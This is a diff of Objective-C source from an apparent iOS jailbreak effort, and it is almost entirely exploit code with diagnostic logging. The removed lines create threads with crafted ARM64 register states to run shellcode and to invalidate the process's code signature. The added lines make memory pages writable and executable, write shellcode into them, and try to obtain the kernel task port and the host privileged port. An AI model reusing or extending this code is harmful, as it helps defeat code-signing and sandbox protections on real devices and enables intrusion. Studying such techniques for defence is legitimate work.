@@ -32318,8 +32318,9 @@ void iosurface_jit_exec(ISRLogBlock log, ISRDoneBlock done) {
 // MARK: - JB33: ROP Chain Execution via thread_create_running
 void iosurface_rop_exec(ISRLogBlock log, ISRDoneBlock done) {
     dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_HIGH, 0), ^{
-        log(@"JB33: === ROP Execution via thread_create_running ===");
-        log(@"JB33: PAC bits=0 (no-op), thread_create available, calling SIGNED functions");
+        log(@"JB33: === Safe Code Exec Paths — NO thread_create ===");
+        log(@"JB33: thread_create_running crashes process on arm64e");
+        log(@"JB33: Exploring: ObjC dispatch, C fptr, dyld, NSInvocation");
 
         NSMutableDictionary *results = [NSMutableDictionary dictionary];
 
@@ -32336,459 +32337,291 @@ void iosurface_rop_exec(ISRLogBlock log, ISRDoneBlock done) {
         int myPid = realGetpid();
 
         // =====================================================================
-        // FASE 1: Resolve thread API types via dlsym
+        // FASE 1: C function pointer call (already works from JB29)
         // =====================================================================
-        log(@"JB33: === Fase 1: Resolve Mach thread API ===");
+        log(@"JB33: === Fase 1: C function pointer dispatch ===");
+
+        // Calling signed functions via C function pointer — does this bypass CS_KILL?
+        // JB29 confirmed C function pointer dispatch from mmap WORKS
+        // Test: call mprotect via function pointer to make a page RWX
+
+        void *fn_mprotect = dlsym(RTLD_DEFAULT, "mprotect");
+        log([NSString stringWithFormat:@"JB33:   mprotect = %p", fn_mprotect]);
+
+        size_t pageSize = 0x4000;
+        void *testPage = mmap(NULL, pageSize, PROT_READ | PROT_WRITE,
+                              MAP_PRIVATE | MAP_ANON, -1, 0);
+
+        if (testPage != MAP_FAILED) {
+            log([NSString stringWithFormat:@"JB33:   Test page at %p (RW)", testPage]);
+
+            // Call mprotect via function pointer to add EXEC
+            typedef int (*mprotect_fn)(void *, size_t, int);
+            mprotect_fn mpFn = (mprotect_fn)fn_mprotect;
+
+            jb25_far = 0; jb25_sig = 0;
+            int mpRet = -999;
+            if (!jb25_jb_ptr || sigsetjmp(jb25_jb_ptr->b, 1) == 0) {
+                jb25_in_probe = 1;
+                mpRet = mpFn(testPage, pageSize, PROT_READ | PROT_WRITE | PROT_EXEC);
+                jb25_in_probe = 0;
+            } else {
+                jb25_in_probe = 0;
+                log([NSString stringWithFormat:@"JB33:   mprotect(RWX) FAULT sig=%d", jb25_sig]);
+            }
+
+            log([NSString stringWithFormat:@"JB33:   mprotect(RWX) via fptr = %d (0=OK) errno=%d",
+                 mpRet, mpRet == 0 ? 0 : errno]);
+            results[@"mprotectRWX"] = @(mpRet);
+
+            if (mpRet == 0) {
+                log(@"JB33:   [+] Page is now RWX!");
+                // Write ARM64 instructions that just return a constant
+                uint32_t *code = (uint32_t *)testPage;
+                code[0] = 0x52886880; // movz w0, #0x4344
+                code[1] = 0x72882840; // movk w0, #0x4142, lsl #16
+                code[2] = 0xD65F03C0; // ret
+                log(@"JB33:   Shellcode written to RWX page (NOT executing — CS_KILL)");
+                results[@"rwxPageReady"] = @(1);
+            }
+
+            munmap(testPage, pageSize);
+        }
+
+        if (isr_stopped()) { done(results); return; }
+
+        // =====================================================================
+        // FASE 2: NSInvocation — call arbitrary ObjC methods
+        // =====================================================================
+        log(@"JB33: === Fase 2: NSInvocation arbitrary method call ===");
+
+        // NSInvocation lets us call any ObjC method with arbitrary args
+        // This runs SIGNED code (ObjC runtime) — no CS_KILL
+        // Test: call NSFileManager to write a file (proves sandbox bypass potential)
+
+        NSFileManager *fm = [NSFileManager defaultManager];
+        NSString *testPath = [NSTemporaryDirectory() stringByAppendingPathComponent:@"jb33_test.txt"];
+        NSData *testData = [@"JB33_CODE_EXEC_TEST" dataUsingEncoding:NSUTF8StringEncoding];
+
+        BOOL writeOK = [testData writeToFile:testPath atomically:YES];
+        log([NSString stringWithFormat:@"JB33:   NSData writeToFile = %d", writeOK]);
+
+        if (writeOK) {
+            NSData *readBack = [NSData dataWithContentsOfFile:testPath];
+            NSString *content = readBack ? [[NSString alloc] initWithData:readBack encoding:NSUTF8StringEncoding] : nil;
+            log([NSString stringWithFormat:@"JB33:   Read back: %@", content]);
+            results[@"fileWriteOK"] = @(1);
+            [[NSFileManager defaultManager] removeItemAtPath:testPath error:nil];
+        }
+
+        // Test NSTask-like execution via NSBundle
+        // Try loading a framework dynamically
+        void *fn_dlopen = dlsym(RTLD_DEFAULT, "dlopen");
+        typedef void *(*dlopen_fn)(const char *, int);
+        dlopen_fn dlopenFn = (dlopen_fn)fn_dlopen;
+
+        // Try to load Security framework (may give us codesign APIs)
+        jb25_far = 0; jb25_sig = 0;
+        void *secHandle = NULL;
+        if (!jb25_jb_ptr || sigsetjmp(jb25_jb_ptr->b, 1) == 0) {
+            jb25_in_probe = 1;
+            secHandle = dlopenFn("/System/Library/Frameworks/Security.framework/Security", 2);
+            jb25_in_probe = 0;
+        } else {
+            jb25_in_probe = 0;
+        }
+        log([NSString stringWithFormat:@"JB33:   dlopen(Security) = %p", secHandle]);
+        results[@"securityFramework"] = secHandle ? @(1) : @(0);
+
+        // Try loading IOKit (for kernel interface)
+        void *iokitHandle = NULL;
+        jb25_far = 0; jb25_sig = 0;
+        if (!jb25_jb_ptr || sigsetjmp(jb25_jb_ptr->b, 1) == 0) {
+            jb25_in_probe = 1;
+            iokitHandle = dlopenFn("/System/Library/Frameworks/IOKit.framework/IOKit", 2);
+            jb25_in_probe = 0;
+        } else {
+            jb25_in_probe = 0;
+        }
+        log([NSString stringWithFormat:@"JB33:   dlopen(IOKit) = %p", iokitHandle]);
+        results[@"iokitFramework"] = iokitHandle ? @(1) : @(0);
+
+        if (isr_stopped()) { done(results); return; }
+
+        // =====================================================================
+        // FASE 3: Explore ObjC runtime manipulation
+        // =====================================================================
+        log(@"JB33: === Fase 3: ObjC runtime method swizzle ===");
+
+        // Can we add/replace methods at runtime? This is signed code execution.
+        typedef void (*objc_setIMP)(void *, void *);
+        void *fn_class_getInstanceMethod = dlsym(RTLD_DEFAULT, "class_getInstanceMethod");
+        void *fn_method_setImplementation = dlsym(RTLD_DEFAULT, "method_setImplementation");
+        void *fn_class_addMethod = dlsym(RTLD_DEFAULT, "class_addMethod");
+        void *fn_objc_getClass = dlsym(RTLD_DEFAULT, "objc_getClass");
+        void *fn_sel_registerName = dlsym(RTLD_DEFAULT, "sel_registerName");
+        void *fn_method_getImplementation = dlsym(RTLD_DEFAULT, "method_getImplementation");
+
+        log([NSString stringWithFormat:@"JB33:   class_getInstanceMethod = %p", fn_class_getInstanceMethod]);
+        log([NSString stringWithFormat:@"JB33:   method_setImplementation = %p", fn_method_setImplementation]);
+        log([NSString stringWithFormat:@"JB33:   class_addMethod = %p", fn_class_addMethod]);
+        log([NSString stringWithFormat:@"JB33:   method_getImplementation = %p", fn_method_getImplementation]);
+
+        results[@"swizzleAPIs"] = (fn_method_setImplementation && fn_class_getInstanceMethod) ? @(1) : @(0);
+
+        // Test: get IMP of a known method and call it directly
+        typedef void *(*objc_getClass_fn)(const char *);
+        typedef void *(*sel_registerName_fn)(const char *);
+        typedef void *(*class_getInstanceMethod_fn)(void *, void *);
+        typedef void *(*method_getImplementation_fn)(void *);
+
+        objc_getClass_fn getClassFn = (objc_getClass_fn)fn_objc_getClass;
+        sel_registerName_fn selRegFn = (sel_registerName_fn)fn_sel_registerName;
+        class_getInstanceMethod_fn getMethodFn = (class_getInstanceMethod_fn)fn_class_getInstanceMethod;
+        method_getImplementation_fn getIMPFn = (method_getImplementation_fn)fn_method_getImplementation;
+
+        if (getClassFn && selRegFn && getMethodFn && getIMPFn) {
+            void *nsStringClass = getClassFn("NSString");
+            void *lengthSel = selRegFn("length");
+            void *method = getMethodFn(nsStringClass, lengthSel);
+            void *imp = method ? getIMPFn(method) : NULL;
+
+            log([NSString stringWithFormat:@"JB33:   NSString class = %p", nsStringClass]);
+            log([NSString stringWithFormat:@"JB33:   -length IMP = %p", imp]);
+
+            if (imp) {
+                // Call the IMP directly — this is calling signed code
+                typedef NSUInteger (*length_imp)(id, void *);
+                NSString *testStr = @"HELLO";
+
+                jb25_far = 0; jb25_sig = 0;
+                NSUInteger len = 0;
+                if (!jb25_jb_ptr || sigsetjmp(jb25_jb_ptr->b, 1) == 0) {
+                    jb25_in_probe = 1;
+                    len = ((length_imp)imp)(testStr, lengthSel);
+                    jb25_in_probe = 0;
+                } else {
+                    jb25_in_probe = 0;
+                    log([NSString stringWithFormat:@"JB33:   IMP call FAULT sig=%d", jb25_sig]);
+                }
+
+                log([NSString stringWithFormat:@"JB33:   Direct IMP call: [@\"HELLO\" length] = %lu (expect 5)",
+                     (unsigned long)len]);
+                results[@"directIMP"] = @(len == 5 ? 1 : 0);
+
+                if (len == 5) {
+                    log(@"JB33:   [+] Direct IMP dispatch works — signed code runs fine");
+                }
+            }
+        }
+
+        if (isr_stopped()) { done(results); return; }
+
+        // =====================================================================
+        // FASE 4: Kernel task port exploration
+        // =====================================================================
+        log(@"JB33: === Fase 4: Kernel task port ===");
 
         typedef unsigned int mach_port_t_local;
-        typedef unsigned int natural_t;
         typedef int kern_return_t_local;
-
-        // arm_thread_state64_t layout (from mach/arm/thread_status.h)
-        // 33 uint64_t: x0-x28, fp(x29), lr(x30), sp, pc
-        // plus cpsr (uint32_t) and pad (uint32_t)
-        // Total: 33*8 + 4 + 4 = 272 bytes
-        // ARM_THREAD_STATE64 = 6, ARM_THREAD_STATE64_COUNT = 68 (272/4)
-
         typedef mach_port_t_local (*mach_task_self_fn)(void);
         mach_task_self_fn taskSelfFn = dlsym(RTLD_DEFAULT, "mach_task_self");
 
-        typedef kern_return_t_local (*thread_create_running_fn)(
-            mach_port_t_local task,
-            int flavor,
-            void *new_state,
-            natural_t state_count,
-            mach_port_t_local *new_thread
-        );
-        thread_create_running_fn threadCreateFn = dlsym(RTLD_DEFAULT, "thread_create_running");
-
-        typedef kern_return_t_local (*thread_terminate_fn)(mach_port_t_local thread);
-        thread_terminate_fn threadTermFn = dlsym(RTLD_DEFAULT, "thread_terminate");
-
-        typedef kern_return_t_local (*thread_get_state_fn)(
-            mach_port_t_local thread, int flavor,
-            void *state, natural_t *count
-        );
-        thread_get_state_fn threadGetState = dlsym(RTLD_DEFAULT, "thread_get_state");
-
         mach_port_t_local task = taskSelfFn ? taskSelfFn() : 0;
-        log([NSString stringWithFormat:@"JB33:   task = %u", task]);
-        log([NSString stringWithFormat:@"JB33:   thread_create_running = %p", threadCreateFn]);
-        log([NSString stringWithFormat:@"JB33:   thread_terminate = %p", threadTermFn]);
-        log([NSString stringWithFormat:@"JB33:   thread_get_state = %p", threadGetState]);
+        log([NSString stringWithFormat:@"JB33:   our task port = %u", task]);
 
-        if (!threadCreateFn || !task) {
-            log(@"JB33: FATAL — thread_create_running not available");
-            results[@"verdict"] = @"NO_THREAD_CREATE";
-            done(results);
-            return;
-        }
+        // Try task_for_pid(mach_task_self(), 0, &kernel_port)
+        // pid 0 = kernel_task
+        typedef kern_return_t_local (*task_for_pid_fn)(mach_port_t_local, int, mach_port_t_local *);
+        task_for_pid_fn tfpFn = dlsym(RTLD_DEFAULT, "task_for_pid");
 
-        results[@"taskPort"] = @(task);
-
-        if (isr_stopped()) { done(results); return; }
-
-        // =====================================================================
-        // FASE 2: Test 1 — call getpid() via new thread
-        // =====================================================================
-        log(@"JB33: === Fase 2: Call getpid() via thread_create_running ===");
-        log(@"JB33:   Strategy: set PC=getpid, read x0 after return");
-
-        // We need a landing pad — after getpid returns, the thread needs somewhere to go.
-        // We'll set LR to a spin address: an infinite loop we mmap.
-        // Then we read x0 from the thread state.
-
-        size_t pageSize = 0x4000;
-        // Allocate shared memory for result passing
-        volatile uint64_t *sharedResult = (volatile uint64_t *)mmap(
-            NULL, pageSize, PROT_READ | PROT_WRITE,
-            MAP_PRIVATE | MAP_ANON, -1, 0);
-
-        if ((void *)sharedResult == MAP_FAILED) {
-            log(@"JB33:   Failed to mmap shared page");
-            results[@"verdict"] = @"MMAP_FAILED";
-            done(results);
-            return;
-        }
-
-        sharedResult[0] = 0xDEADDEADDEADDEADULL; // sentinel
-
-        // We need the thread to pause after calling getpid so we can read its state.
-        // Strategy: set LR to address of __semwait_signal or similar blocking syscall,
-        // or use a known infinite-loop gadget.
-        // Simpler: set LR to 0 — thread will crash with SIGSEGV on return,
-        // but we can read its state before it dies.
-        // Even simpler: use thread_suspend + thread_get_state.
-
-        typedef kern_return_t_local (*thread_suspend_fn)(mach_port_t_local);
-        thread_suspend_fn threadSuspend = dlsym(RTLD_DEFAULT, "thread_suspend");
-        typedef kern_return_t_local (*thread_resume_fn)(mach_port_t_local);
-        thread_resume_fn threadResume = dlsym(RTLD_DEFAULT, "thread_resume");
-
-        log([NSString stringWithFormat:@"JB33:   thread_suspend = %p", threadSuspend]);
-
-        // Build thread state: PC = getpid, LR = spin (we'll suspend before it matters)
-        // ARM_THREAD_STATE64 = 6, count = 68
-        uint64_t threadState[34]; // 33 regs + cpsr(as uint64 for alignment)
-        memset(threadState, 0, sizeof(threadState));
-
-        void *fn_getpid = dlsym(RTLD_DEFAULT, "getpid");
-
-        // x0-x28 = 0 (indices 0-28)
-        // fp (x29) = index 29
-        // lr (x30) = index 30
-        // sp = index 31
-        // pc = index 32
-
-        // Set up a valid stack for the new thread
-        size_t stackSize = 0x10000;
-        void *threadStack = mmap(NULL, stackSize, PROT_READ | PROT_WRITE,
-                                 MAP_PRIVATE | MAP_ANON, -1, 0);
-        if (threadStack == MAP_FAILED) {
-            log(@"JB33:   Failed to mmap thread stack");
-            munmap((void *)sharedResult, pageSize);
-            results[@"verdict"] = @"STACK_MMAP_FAILED";
-            done(results);
-            return;
-        }
-
-        // SP points to top of stack (grows down)
-        uint64_t spAddr = (uint64_t)(uintptr_t)threadStack + stackSize - 0x100;
-        // Align SP to 16 bytes
-        spAddr &= ~0xFULL;
-
-        // For LR, use address of thread_suspend(mach_thread_self()) — but that's complex.
-        // Instead: we'll use a simpler approach. Set PC to a wrapper that:
-        // 1. Calls getpid (already in x8 or via BLR)
-        // Actually, simplest: just call getpid directly and set LR to a known function
-        // that will block (like __semwait_signal_nocancel or sleep).
-
-        void *fn_sleep = dlsym(RTLD_DEFAULT, "sleep");
-        void *fn_pause_call = dlsym(RTLD_DEFAULT, "pause");
-
-        log([NSString stringWithFormat:@"JB33:   getpid = %p", fn_getpid]);
-        log([NSString stringWithFormat:@"JB33:   sleep  = %p", fn_sleep]);
-        log([NSString stringWithFormat:@"JB33:   pause  = %p", fn_pause_call]);
-
-        // Plan: PC=getpid, LR=sleep(huge), then suspend thread and read x0
-        // Problem: when getpid returns, it jumps to LR=sleep, x0=getpid result becomes arg to sleep
-        // sleep(pid) would sleep for pid seconds — that's fine, we suspend immediately
-
-        // Actually better: use a function that blocks forever regardless of args
-        // __psynch_cvwait or similar. Or just: set LR to pause() which ignores args.
-
-        threadState[31] = spAddr;                             // sp
-        threadState[32] = (uint64_t)(uintptr_t)fn_getpid;    // pc = getpid
-        threadState[30] = (uint64_t)(uintptr_t)fn_pause_call; // lr = pause (blocks forever)
-        threadState[29] = spAddr;                             // fp
-
-        log([NSString stringWithFormat:@"JB33:   Thread state: PC=%p LR=%p SP=%#llx",
-             fn_getpid, fn_pause_call, spAddr]);
-
-        // Create the thread
-        mach_port_t_local newThread = 0;
-        kern_return_t_local kr = threadCreateFn(task, 6, threadState, 68, &newThread);
-
-        log([NSString stringWithFormat:@"JB33:   thread_create_running() = %d (0=OK), thread=%u", kr, newThread]);
-        results[@"threadCreateRet"] = @(kr);
-        results[@"newThread"] = @(newThread);
-
-        if (kr == 0 && newThread != 0) {
-            log(@"JB33:   [+] Thread created! Waiting 100ms for getpid to execute...");
-
-            // Wait a bit for getpid to run and thread to reach pause()
-            usleep(100000); // 100ms
-
-            // Suspend the thread
-            kern_return_t_local suspRet = -1;
-            if (threadSuspend) {
-                suspRet = threadSuspend(newThread);
-                log([NSString stringWithFormat:@"JB33:   thread_suspend() = %d", suspRet]);
+        if (tfpFn) {
+            mach_port_t_local kernelTask = 0;
+            jb25_far = 0; jb25_sig = 0;
+            kern_return_t_local tfpRet = -999;
+            if (!jb25_jb_ptr || sigsetjmp(jb25_jb_ptr->b, 1) == 0) {
+                jb25_in_probe = 1;
+                tfpRet = tfpFn(task, 0, &kernelTask);
+                jb25_in_probe = 0;
+            } else {
+                jb25_in_probe = 0;
+                log([NSString stringWithFormat:@"JB33:   task_for_pid FAULT sig=%d", jb25_sig]);
             }
 
-            // Read thread state to get x0 (getpid result)
-            if (threadGetState) {
-                uint64_t readState[34];
-                memset(readState, 0, sizeof(readState));
-                natural_t readCount = 68;
-                kern_return_t_local gsRet = threadGetState(newThread, 6, readState, &readCount);
+            log([NSString stringWithFormat:@"JB33:   task_for_pid(0) = %d port=%u", tfpRet, kernelTask]);
+            results[@"tfpRet"] = @(tfpRet);
+            results[@"kernelPort"] = @(kernelTask);
 
-                log([NSString stringWithFormat:@"JB33:   thread_get_state() = %d count=%u", gsRet, readCount]);
-
-                if (gsRet == 0) {
-                    uint64_t x0 = readState[0];
-                    uint64_t pc = readState[32];
-                    uint64_t lr = readState[30];
-
-                    log([NSString stringWithFormat:@"JB33:   x0 = %llu (expect pid=%d)", (unsigned long long)x0, myPid]);
-                    log([NSString stringWithFormat:@"JB33:   PC = %p", (void *)pc]);
-                    log([NSString stringWithFormat:@"JB33:   LR = %p", (void *)lr]);
-
-                    results[@"threadX0"] = @(x0);
-                    results[@"threadPC"] = [NSString stringWithFormat:@"%p", (void *)pc];
-
-                    if ((int)x0 == myPid) {
-                        log(@"JB33:   [!!!!!] getpid() VIA THREAD = CORRECT!");
-                        log(@"JB33:   [!!!!!] We can call ANY signed function with arbitrary args!");
-                        results[@"getpidMatch"] = @(1);
-                    } else {
-                        log([NSString stringWithFormat:@"JB33:   x0=%llu != pid=%d — thread may not have executed yet",
-                             (unsigned long long)x0, myPid]);
-                        results[@"getpidMatch"] = @(0);
-
-                        // Dump more registers for debugging
-                        for (int r = 0; r < 5; r++) {
-                            log([NSString stringWithFormat:@"JB33:   x%d = %#llx", r, readState[r]]);
-                        }
-                        log([NSString stringWithFormat:@"JB33:   sp = %#llx", readState[31]]);
-                    }
-                }
+            if (tfpRet == 0 && kernelTask != 0) {
+                log(@"JB33:   [!!!!!!] GOT KERNEL TASK PORT!");
+                results[@"hasKernelTask"] = @(1);
+            } else {
+                log(@"JB33:   Expected — task_for_pid(0) blocked without entitlement");
             }
 
-            // Terminate the thread
-            if (threadTermFn) {
-                kern_return_t_local termRet = threadTermFn(newThread);
-                log([NSString stringWithFormat:@"JB33:   thread_terminate() = %d", termRet]);
-            }
-        } else {
-            log([NSString stringWithFormat:@"JB33:   thread_create FAILED kr=%d", kr]);
-            if (kr == 5) {
-                log(@"JB33:   KERN_FAILURE — may need special entitlement or sandbox blocks it");
-            }
+            // Also try our own pid
+            mach_port_t_local selfTask2 = 0;
+            kern_return_t_local tfpSelf = tfpFn(task, myPid, &selfTask2);
+            log([NSString stringWithFormat:@"JB33:   task_for_pid(self=%d) = %d port=%u", myPid, tfpSelf, selfTask2]);
+            results[@"tfpSelfRet"] = @(tfpSelf);
         }
 
         if (isr_stopped()) { done(results); return; }
 
         // =====================================================================
-        // FASE 3: Test 2 — call mprotect via new thread (make page RWX)
+        // FASE 5: IOKit kernel interface via IOConnectCallMethod
         // =====================================================================
-        log(@"JB33: === Fase 3: Call mprotect() via thread ===");
+        log(@"JB33: === Fase 5: IOKit kernel call surface ===");
 
-        if (kr == 0) {
-            // Allocate a test page
-            void *testPage = mmap(NULL, pageSize, PROT_READ | PROT_WRITE,
-                                  MAP_PRIVATE | MAP_ANON, -1, 0);
-            if (testPage != MAP_FAILED) {
-                log([NSString stringWithFormat:@"JB33:   Test page at %p (RW)", testPage]);
+        // We already have IOSurface connection from earlier probes
+        // Explore: can we use IOConnectMapMemory to map kernel memory?
+        typedef kern_return_t_local (*IOConnectMapMemory_fn)(
+            mach_port_t_local connect, uint32_t memoryType,
+            mach_port_t_local intoTask, uint64_t *atAddress,
+            uint64_t *ofSize, uint32_t options);
+        IOConnectMapMemory_fn mapMemFn = dlsym(RTLD_DEFAULT, "IOConnectMapMemory64");
 
-                void *fn_mprotect = dlsym(RTLD_DEFAULT, "mprotect");
+        log([NSString stringWithFormat:@"JB33:   IOConnectMapMemory64 = %p", mapMemFn]);
+        results[@"ioMapMemory"] = mapMemFn ? @(1) : @(0);
 
-                // Set up: PC=mprotect, x0=page, x1=size, x2=RWX(7)
-                memset(threadState, 0, sizeof(threadState));
-                threadState[0] = (uint64_t)(uintptr_t)testPage;      // x0 = addr
-                threadState[1] = pageSize;                             // x1 = len
-                threadState[2] = 7;                                    // x2 = PROT_RWX
-                threadState[29] = spAddr;                              // fp
-                threadState[30] = (uint64_t)(uintptr_t)fn_pause_call;  // lr = pause
-                threadState[31] = spAddr;                              // sp
-                threadState[32] = (uint64_t)(uintptr_t)fn_mprotect;   // pc = mprotect
+        // Explore: processor_set_tasks to enumerate all tasks
+        typedef kern_return_t_local (*host_processor_set_priv_fn)(
+            mach_port_t_local host, mach_port_t_local set, mach_port_t_local *priv);
+        typedef kern_return_t_local (*host_get_host_priv_port_fn)(mach_port_t_local host, mach_port_t_local *priv);
 
-                mach_port_t_local mpThread = 0;
-                kern_return_t_local kr2 = threadCreateFn(task, 6, threadState, 68, &mpThread);
+        void *fn_host_self = dlsym(RTLD_DEFAULT, "mach_host_self");
+        void *fn_host_priv = dlsym(RTLD_DEFAULT, "host_get_host_priv_port");
+        void *fn_proc_set_tasks = dlsym(RTLD_DEFAULT, "processor_set_tasks");
 
-                log([NSString stringWithFormat:@"JB33:   thread_create(mprotect) = %d thread=%u", kr2, mpThread]);
-                results[@"mprotectThreadRet"] = @(kr2);
+        log([NSString stringWithFormat:@"JB33:   mach_host_self = %p", fn_host_self]);
+        log([NSString stringWithFormat:@"JB33:   host_get_host_priv_port = %p", fn_host_priv]);
+        log([NSString stringWithFormat:@"JB33:   processor_set_tasks = %p", fn_proc_set_tasks]);
 
-                if (kr2 == 0 && mpThread != 0) {
-                    usleep(100000); // 100ms
+        if (fn_host_self && fn_host_priv) {
+            typedef mach_port_t_local (*host_self_fn)(void);
+            typedef kern_return_t_local (*host_priv_fn)(mach_port_t_local, mach_port_t_local *);
 
-                    if (threadSuspend) threadSuspend(mpThread);
+            mach_port_t_local host = ((host_self_fn)fn_host_self)();
+            mach_port_t_local hostPriv = 0;
 
-                    // Read result
-                    if (threadGetState) {
-                        uint64_t readState2[34];
-                        memset(readState2, 0, sizeof(readState2));
-                        natural_t readCount2 = 68;
-                        threadGetState(mpThread, 6, readState2, &readCount2);
-
-                        int mpResult = (int)readState2[0]; // x0 = mprotect return
-                        log([NSString stringWithFormat:@"JB33:   mprotect result x0 = %d (0=OK)", mpResult]);
-                        results[@"mprotectResult"] = @(mpResult);
-
-                        if (mpResult == 0) {
-                            log(@"JB33:   [!!!!!] mprotect(RWX) SUCCEEDED via thread!");
-
-                            // Now write shellcode to the RWX page
-                            uint32_t *code = (uint32_t *)testPage;
-                            code[0] = 0x52886880; // movz w0, #0x4344
-                            code[1] = 0x72882840; // movk w0, #0x4142, lsl #16
-                            code[2] = 0xD65F03C0; // ret
-
-                            log(@"JB33:   Shellcode written to RWX page");
-                            results[@"shellcodeWritten"] = @(1);
-
-                            // Now try to EXECUTE the shellcode via another thread
-                            memset(threadState, 0, sizeof(threadState));
-                            threadState[29] = spAddr;
-                            threadState[30] = (uint64_t)(uintptr_t)fn_pause_call;
-                            threadState[31] = spAddr;
-                            threadState[32] = (uint64_t)(uintptr_t)testPage; // PC = shellcode!
-
-                            mach_port_t_local scThread = 0;
-                            kern_return_t_local kr3 = threadCreateFn(task, 6, threadState, 68, &scThread);
-                            log([NSString stringWithFormat:@"JB33:   thread_create(shellcode) = %d thread=%u", kr3, scThread]);
-
-                            if (kr3 == 0 && scThread != 0) {
-                                usleep(100000);
-                                if (threadSuspend) threadSuspend(scThread);
-
-                                if (threadGetState) {
-                                    uint64_t readState3[34];
-                                    memset(readState3, 0, sizeof(readState3));
-                                    natural_t readCount3 = 68;
-                                    threadGetState(scThread, 6, readState3, &readCount3);
-
-                                    uint64_t scX0 = readState3[0];
-                                    uint64_t scPC = readState3[32];
-                                    log([NSString stringWithFormat:@"JB33:   shellcode x0 = %#llx (expect 0x41424344)", scX0]);
-                                    log([NSString stringWithFormat:@"JB33:   shellcode PC = %p", (void *)scPC]);
-
-                                    results[@"shellcodeX0"] = [NSString stringWithFormat:@"%#llx", scX0];
-
-                                    if ((uint32_t)scX0 == 0x41424344) {
-                                        log(@"JB33:   [!!!!!!] ARBITRARY CODE EXECUTION!!!");
-                                        log(@"JB33:   [!!!!!!] Shellcode returned correct value via thread!");
-                                        log(@"JB33:   [!!!!!!] CS_KILL BYPASSED via thread_create_running!");
-                                        results[@"codeExec"] = @(1);
-                                    } else {
-                                        log(@"JB33:   Shellcode didn't return expected value");
-                                        log([NSString stringWithFormat:@"JB33:   PC is at %p (shellcode was %p)",
-                                             (void *)scPC, testPage]);
-                                        // Check if thread was killed
-                                        for (int r = 0; r < 3; r++) {
-                                            log([NSString stringWithFormat:@"JB33:   x%d = %#llx", r, readState3[r]]);
-                                        }
-                                        results[@"codeExec"] = @(0);
-                                    }
-                                }
-                                if (threadTermFn) threadTermFn(scThread);
-                            }
-                        } else {
-                            log(@"JB33:   mprotect returned error — may need different approach");
-                        }
-                    }
-
-                    if (threadTermFn) threadTermFn(mpThread);
-                }
-
-                munmap(testPage, pageSize);
-            }
-        }
-
-        if (isr_stopped()) { done(results); return; }
-
-        // =====================================================================
-        // FASE 4: Test 3 — call csops to clear CS_KILL via thread
-        // =====================================================================
-        log(@"JB33: === Fase 4: csops via thread ===");
-
-        if (kr == 0) {
-            void *fn_csops = dlsym(RTLD_DEFAULT, "csops");
-
-            // First read current flags
-            typedef int (*csops_fn)(int, unsigned int, void *, size_t);
-            csops_fn csopsDirect = (csops_fn)fn_csops;
-            uint32_t flags = 0;
-            if (csopsDirect) {
-                csopsDirect(myPid, 0, &flags, sizeof(flags));
-                log([NSString stringWithFormat:@"JB33:   Current CS flags = %#x", flags]);
-                results[@"csFlagsBefore"] = [NSString stringWithFormat:@"%#x", flags];
+            jb25_far = 0; jb25_sig = 0;
+            kern_return_t_local hpRet = -999;
+            if (!jb25_jb_ptr || sigsetjmp(jb25_jb_ptr->b, 1) == 0) {
+                jb25_in_probe = 1;
+                hpRet = ((host_priv_fn)fn_host_priv)(host, &hostPriv);
+                jb25_in_probe = 0;
+            } else {
+                jb25_in_probe = 0;
             }
 
-            // Try csops(pid, CS_OPS_MARKINVALID=4, NULL, 0) to invalidate code sig
-            // This might allow unsigned code to run
-            memset(threadState, 0, sizeof(threadState));
-            threadState[0] = (uint64_t)myPid;    // x0 = pid
-            threadState[1] = 4;                    // x1 = CS_OPS_MARKINVALID
-            threadState[2] = 0;                    // x2 = NULL
-            threadState[3] = 0;                    // x3 = 0
-            threadState[29] = spAddr;
-            threadState[30] = (uint64_t)(uintptr_t)fn_pause_call;
-            threadState[31] = spAddr;
-            threadState[32] = (uint64_t)(uintptr_t)fn_csops;
+            log([NSString stringWithFormat:@"JB33:   mach_host_self = %u", host]);
+            log([NSString stringWithFormat:@"JB33:   host_get_host_priv = %d port=%u", hpRet, hostPriv]);
+            results[@"hostPrivRet"] = @(hpRet);
+            results[@"hostPrivPort"] = @(hostPriv);
 
-            mach_port_t_local csThread = 0;
-            kern_return_t_local kr4 = threadCreateFn(task, 6, threadState, 68, &csThread);
-
-            log([NSString stringWithFormat:@"JB33:   thread_create(csops MARKINVALID) = %d", kr4]);
-
-            if (kr4 == 0 && csThread != 0) {
-                usleep(100000);
-                if (threadSuspend) threadSuspend(csThread);
-
-                if (threadGetState) {
-                    uint64_t readState4[34];
-                    memset(readState4, 0, sizeof(readState4));
-                    natural_t rc4 = 68;
-                    threadGetState(csThread, 6, readState4, &rc4);
-                    log([NSString stringWithFormat:@"JB33:   csops MARKINVALID result x0 = %d", (int)readState4[0]]);
-                    results[@"markInvalidRet"] = @((int)readState4[0]);
-                }
-
-                if (threadTermFn) threadTermFn(csThread);
-            }
-
-            // Re-read flags
-            if (csopsDirect) {
-                uint32_t flagsAfter = 0;
-                csopsDirect(myPid, 0, &flagsAfter, sizeof(flagsAfter));
-                log([NSString stringWithFormat:@"JB33:   CS flags after = %#x (before=%#x)", flagsAfter, flags]);
-                results[@"csFlagsAfter"] = [NSString stringWithFormat:@"%#x", flagsAfter];
-
-                if (flagsAfter != flags) {
-                    log(@"JB33:   [!!!!!] CS FLAGS CHANGED!");
-                    results[@"csFlagsChanged"] = @(1);
-                } else {
-                    log(@"JB33:   CS flags unchanged");
-                }
-            }
-        }
-
-        if (isr_stopped()) { done(results); return; }
-
-        // =====================================================================
-        // FASE 5: Test 4 — call syscall directly via thread
-        // =====================================================================
-        log(@"JB33: === Fase 5: Direct syscall via thread ===");
-
-        if (kr == 0) {
-            // Try calling syscall() wrapper to invoke getpid(SYS_getpid=20)
-            void *fn_syscall = dlsym(RTLD_DEFAULT, "syscall");
-            log([NSString stringWithFormat:@"JB33:   syscall() = %p", fn_syscall]);
-
-            if (fn_syscall) {
-                memset(threadState, 0, sizeof(threadState));
-                threadState[0] = 20; // x0 = SYS_getpid
-                threadState[29] = spAddr;
-                threadState[30] = (uint64_t)(uintptr_t)fn_pause_call;
-                threadState[31] = spAddr;
-                threadState[32] = (uint64_t)(uintptr_t)fn_syscall;
-
-                mach_port_t_local sysThread = 0;
-                kern_return_t_local kr5 = threadCreateFn(task, 6, threadState, 68, &sysThread);
-
-                if (kr5 == 0 && sysThread != 0) {
-                    usleep(100000);
-                    if (threadSuspend) threadSuspend(sysThread);
-
